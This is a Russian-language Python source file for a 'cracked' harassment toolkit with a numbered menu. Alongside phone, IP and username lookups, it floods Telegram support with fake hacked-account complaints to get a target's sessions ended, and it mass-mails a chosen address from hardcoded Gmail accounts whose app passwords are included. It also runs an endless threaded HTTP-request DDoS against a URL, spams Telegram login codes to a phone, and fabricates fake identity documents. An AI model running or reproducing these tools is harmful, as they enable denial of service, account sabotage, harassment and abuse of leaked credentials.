import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import random
import requests
import time
from fake_useragent import UserAgent
import platform
import socket
from datetime import datetime
import os
import pystyle
import phonenumbers
from phonenumbers import timezone, carrier, geocoder
import threading
import bs4
import urllib.parse
import concurrent.futures
import csv
import whois
import datetime
from termcolor import colored
from telethon import TelegramClient, sync
import os
import sys
from pystyle import Colors, Write, Center
import faker
from colorama import Fore, Style, init
import random
import string
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import requests
from telethon.sync import TelegramClient
from telethon.tl.functions.channels import ReportSpamRequest
import pyfiglet
from termcolor import colored

#Кряк by Alternative

os.system("pip install pystyle phonenumbers requests whois python-whois py-whois pywhois pythonwhois colorama termcolor")

def Main():
    if platform.system() == "Windows":
        os.system("cls")
        pystyle.Write.Print(pystyle.Center.XCenter('\033[91m\n░▒▓██████████████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        \n░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        \n░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        \n░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░        \n░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        \n░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        \n░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        \n░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒                \n Автор: @YGPOZA_JIZHI \n'''), pystyle.Colors.red_to_green, interval=0.001)
    else:
        os.system("clear")
        pystyle.Write.Print(pystyle.Center.XCenter('░▒▓██████████████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░       \n░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░       \n░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░       \n░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░       \n░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░       \n░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░       \n░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░       \n░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒                \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n  Автор:@YGPOZA_JIZHI   Версия: PREMIUM 10$ \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n'), pystyle.Colors.red_to_green, interval=0.001)
        pystyle.Write.Print('\n       ══════════════════════════════════════', pystyle.Colors.green_to_black, interval=0.001)
    pystyle.Write.Print(('\n    ╎ [1]Поиск по номеру  ╎  [6]Снос сессии   ╎\n    ╎ ——————————————————————————————————————— ╎\n    ╎ [2]Поиск по ip      ╎  [7]Смс код на тг ╎\n    ╎ ——————————————————————————————————————— ╎\n    ╎ [3]Поиск по нику (тг)  ╎  [8]Сват         ╎\n    ╎ ——————————————————————————————————————— ╎\n    ╎ [4]ДДос на сайт     ╎  [9]Об авторе     ╎\n    ╎ ——————————————————————————————————————— ╎\n    ╎ [5]Фейк личка       ╎  [10]Помощь       ╎'), pystyle.Colors.red_to_green, interval=0.001)
    pystyle.Write.Print('\n       ══════════════════════════════════════', pystyle.Colors.green_to_black, interval=0.001)
    
# Определим функцию для отправки электронной почты
def send_email(sender_email, sender_password, receiver_email, message):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = 'ПОМОГИТЕ'
        msg.attach(MIMEText(message, 'plain'))
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
        print("Письмо успешно отправлено! by #MHL")
    except Exception as e:
        print(f"Ошибка при отправке письма: {e}")

# Определим функцию для отправки запроса по указанному URL
def make_request(url):
    response = requests.get(url)
    print(response.status_code)

# Основной цикл программы
Main()
while True:
    select = pystyle.Write.Input("\n\n[?] Выберите пункт меню: ", pystyle.Colors.red_to_green, interval=0.001)
    if select == "6":
        device_name = socket.gethostname()
        ip_address = socket.gethostbyname(device_name)
        current_time = datetime.datetime.now()
        print(colored(f"Скрипт был запущен: Устройство: {device_name}", 'red'))
        print(colored(f"Точное время: {current_time}", 'cyan'))
        print(colored(f"IP-адрес: {ip_address}", 'blue'))
        url = 'https://telegram.org/support'
        ua = UserAgent()

        yukino = 0

        def send_complaint(text, contact):
            headers = {
                'User-Agent': ua.random
            }
            payload = {
                'text': text,
                'contact': contact
            }

            proxies = {
                'http': '62.33.207.202:80',
                'http': '5.189.184.147:27191',
                'http': '50.221.74.130:80',
                'http': '172.67.43.209:80',
            }

            response = requests.post(url, data=payload, headers=headers, proxies=proxies)

            if response.status_code == 200:
                print(f"\33[92mЖалоба успешно отправлена\n Всего отправлено", yukino, "сообщений\33[0m")
            else:
                print(colored(f"Произошла ошибка при отправке жалобы", 'red'))

        usernick = input('Введите ник с @: ')
        userid = input('Введите ид: ')
        text = [
            "Hello dear telegram moderators. I went to the logger link and I was hacked, my account ({userid}/{username}) I can’t log into it and I’m afraid for the information in it, I ask you to end all sessions in it.",
        ]

        contact = [
            "+79967285422",
            "+79269736273",
            "+79963668355",
            "+79661214909",
            "+79254106650",
            "+22666228126",
            "+79269069196",
            "+79315894431",
            "+79621570718",
        ]

        while True:
            yukino += 1
            chosen_text = random.choice(text)
            chosen_contact = random.choice(contact)
            send_complaint(chosen_text, chosen_contact)
            time.sleep(0)

    elif select == "9":
        pystyle.Write.Input("\n        Создатель софта => @YGPOZA_JIZHI \n    Нажмите enter для продолжения", pystyle.Colors.red_to_green, interval=0.005)
    elif select == "1":
        phone = pystyle.Write.Input("\n[?] Введите номер телефона -> ", pystyle.Colors.red_to_green, interval=0.005)
        # Определим функцию для получения информации о номере телефона
        def phoneinfo(phone):
            try:
                parsed_phone = phonenumbers.parse(phone, None)
                if not phonenumbers.is_valid_number(parsed_phone):
                    return pystyle.Write.Print(f"\n[!] Произошла ошибка -> Недействительный номер телефона\n", pystyle.Colors.red_to_green, interval=0.005)
                carrier_info = carrier.name_for_number(parsed_phone, "en")
                country = geocoder.description_for_number(parsed_phone, "en")
                region = geocoder.description_for_number(parsed_phone, "ru")
                formatted_number = phonenumbers.format_number(parsed_phone, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
                is_valid = phonenumbers.is_valid_number(parsed_phone)
                is_possible = phonenumbers.is_possible_number(parsed_phone)
                timezona = timezone.time_zones_for_number(parsed_phone)
                print_phone_info = f"""\n[+] Номер телефона -> {formatted_number}
[+] Страна -> {country}
[+] Регион -> {region}
[+] Оператор -> {carrier_info}
[+] Активен -> {is_possible}
[+] Валид -> {is_valid}
[+] Таймзона -> {timezona}
[+] Telegram -> https://t.me/{phone}
[+] Whatsapp -> https://wa.me/{phone}
[+] Viber -> https://viber.click/{phone}\n"""
                pystyle.Write.Print(print_phone_info, pystyle.Colors.red_to_green, interval=0.005)
            except Exception as e:
                pystyle.Write.Print(f"\n[!] Произошла ошибка -> {str(e)}\n", pystyle.Colors.red_to_green, interval=0.005)
        phoneinfo(phone)
    elif select == "3":
        nick = pystyle.Write.Input(f"\n[?] Введите ник -> ", pystyle.Colors.red_to_green, interval=0.005)
        urls = [
            f"https://www.instagram.com/{nick}",
            f"https://www.tiktok.com/@{nick}",
            f"https://twitter.com/{nick}",
            f"https://www.facebook.com/{nick}",
            f"https://www.youtube.com/@{nick}",
            f"https://t.me/{nick}",
            f"https://www.roblox.com/user.aspx?username={nick}",
            f"https://www.twitch.tv/{nick}",
        ]
        for url in urls:
            try:
                response = requests.get(url)
                if response.status_code == 200:
                    pystyle.Write.Print(f"\n{url} - Найден", pystyle.Colors.red_to_green, interval=0.005)
                elif response.status_code == 404:
                    pystyle.Write.Print(f"\n{url} - Не найден", pystyle.Colors.red_to_green, interval=0.005)
                else:
                    pystyle.Write.Print(f"\n{url} - Ошибка {response.status_code}", pystyle.Colors.red_to_green, interval=0.005)
            except:
                pystyle.Write.Print(f"\n{url} - Ошибка при проверке", pystyle.Colors.red_to_green, interval=0.005)
        print()
    elif select == "2":
        ip = pystyle.Write.Input("\n[?] Введите IP-адрес -> ", pystyle.Colors.red_to_green, interval=0.005)
        # Определим функцию для поиска информации об IP-адресе
        def ip_lookup(ip):
            url = f"http://ip-api.com/json/{ip}"
            try:
                response = requests.get(url)
                data = response.json()
                if data.get("status") == "fail":
                    pystyle.Write.Print(f"[!] Произошла ошибка: {data['message']}\n", pystyle.Colors.red_to_green, interval=0.005)
                info = ""
                for key, value in data.items():
                    info += f"[+] {key}: {value}\n"
                return info
            except Exception as e:
                pystyle.Write.Print(f"[!] Произошла ошибка: {str(e)}\n", pystyle.Colors.red_to_green, interval=0.005)
        print()
        pystyle.Write.Print(ip_lookup(ip), pystyle.Colors.green, interval=0.005)
    elif select == "8":
        def send_email(sender_email, sender_password, receiver_email, message):
            try:
                server = smtplib.SMTP('smtp.gmail.com', 587)  # СЕРВЕР, ВМЕСТО GMAIL.COM МОЖНО ВЗЯТЬ RAMBLER.RU, НО ЭТО ЗАВИСИТ ОТ ВАШИХ ПОЧТ
                server.starttls()
                server.login(sender_email, sender_password)
                msg = MIMEMultipart()
                msg['From'] = sender_email
                msg['To'] = receiver_email
                msg['Subject'] = 'ПОМОГИТЕ'
                msg.attach(MIMEText(message, 'plain'))
                server.sendmail(sender_email, receiver_email, msg.as_string())
                server.quit()
                print("Письмо успешно отправлено! by #MHL")
            except Exception as e:
                print(f"Ошибка при отправке письма: {e}")

        senders = {
            'anonymous854785@gmail.com': 'wmth dinz jiek nhfy',
            'andeybirum@gmail.com': 'ouho uujv htlm rwaz',
            'faverokstandof@gmail.com': 'nrsg kchi etta uuzh',
            'faveroktt@gmail.com': 'dywo rgle jjwl hhbq',
            'mksmksergeev@gmail.com': 'ycmw rqii rcbd isfd',
            'maksimafanacefish@gmail.com': 'hdpn tbfp acwv jyro'
        }

        gmail = input('Куда: ')
        receivers = [f'{gmail}']

        message = input('Текст: ')

        for sender_email, sender_password in senders.items():
            for receiver_email in receivers:
                send_email(sender_email, sender_password, receiver_email, message)
    elif select == "4":
        url = input("Введите URL: ")
        while True:
            threads = []
            for _ in range(999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):
                t = threading.Thread(target=make_request, args=(url,))
                threads.append(t)
                t.start()
            for thread in threads:
                thread.join()
    elif select == "7":
        API_ID = '20045757'
        API_HASH = '7d3ea0c0d4725498789bd51a9ee02421'
        client = TelegramClient('session_name', API_ID, API_HASH)
        async def authenticate():
            phone_number = pystyle.Write.input('Введите ваш номер телефона: ', pystyle.Colors.red_to_green, interval=0.005)
            while True:
                client.send_code_request(phone_number)
                time.sleep(1)
        with client:
            client.loop.run_until_complete(authenticate())
    elif select == "5":
        fake = faker.Faker(locale="ru_RU")
        gender = pystyle.Write.Input("\n[?] Введите пол (М - мужской, Ж - женский): ", pystyle.Colors.red_to_green, interval=0.005)
        print()
        if gender not in ["М", "Ж"]:
                    gender = random.choice(["М", "Ж"])
                    pystyle.Write.Print(f"[!] Вы ввели неверное значение, будет выбрано случайным образом: {gender}\n\n", pystyle.Colors.red_to_green, interval=0.005)
        if gender == "М":
            first_name = fake.first_name_male()
            middle_name = fake.middle_name_male()
        else:
            first_name = fake.first_name_female()
            middle_name = fake.middle_name_female()
        last_name = fake.last_name()
        full_name = f"{last_name} {first_name} {middle_name}"
        birthdate = fake.date_of_birth()
        age = fake.random_int(min=18, max=80)
        street_address = fake.street_address()
        city = fake.city()
        region = fake.region()
        postcode = fake.postcode()
        address = f"{street_address}, {city}, {region} {postcode}"
        email = fake.email()
        phone_number = fake.phone_number()
        inn = str(fake.random_number(digits=12, fix_len=True))
        snils = str(fake.random_number(digits=11, fix_len=True))
        passport_num = str(fake.random_number(digits=10, fix_len=True))
        passport_series = fake.random_int(min=1000, max=9999)
        pystyle.Write.Print(f"[+] ФИО: {full_name}\n", pystyle.Colors.red_to_green, interval=0.005)
        pystyle.Write.Print(f"[+] Пол: {gender}\n", pystyle.Colors.red_to_green, interval=0.005)
        pystyle.Write.Print(f"[+] Дата рождения: {birthdate.strftime('%d %B %Y')}\n", pystyle.Colors.red_to_green, interval=0.005)
        pystyle.Write.Print(f"[+] Возраст: {age} лет\n", pystyle.Colors.red_to_green, interval=0.005)
        pystyle.Write.Print(f"[+] Адрес: {address}\n", pystyle.Colors.red_to_green, interval=0.005)
        pystyle.Write.Print(f"[+] Email: {email}\n", pystyle.Colors.red_to_green, interval=0.005)
        pystyle.Write.Print(f"[+] Телефон: {phone_number}\n", pystyle.Colors.red_to_green, interval=0.005)
        pystyle.Write.Print(f"[+] ИНН: {inn}\n", pystyle.Colors.red_to_green, interval=0.005)
        pystyle.Write.Print(f"[+] СНИЛС: {snils}\n", pystyle.Colors.red_to_green, interval=0.005)
        pystyle.Write.Print(f"[+] Паспорт серия: {passport_series} номер: {passport_num}\n", pystyle.Colors.red_to_green, interval=0.005)
    elif select == "10":
        pystyle.Write.Print(f'''
    Здравствуй, пользователь этого софта!
Версия Кряк нахуй этого софта имеет еще две модулы как: Смс код на тг и Фейк личка. Старая, то есть первая версия не имеет этих модулей в своем софте, с чего можно сказать, что это обновленная версия с новыми модулями. С каждым обновлением будут новые модулы, поэтому, чтобы развивать этот софт и быть пользователем ахуенного софта, то попрошу не сливать его.
#Сосо бомжи Crack by Alternarive Hospital
Спасибо за понимание и внимание.
                                                         by MHL''', pystyle.Colors.red_to_green, interval=0.005)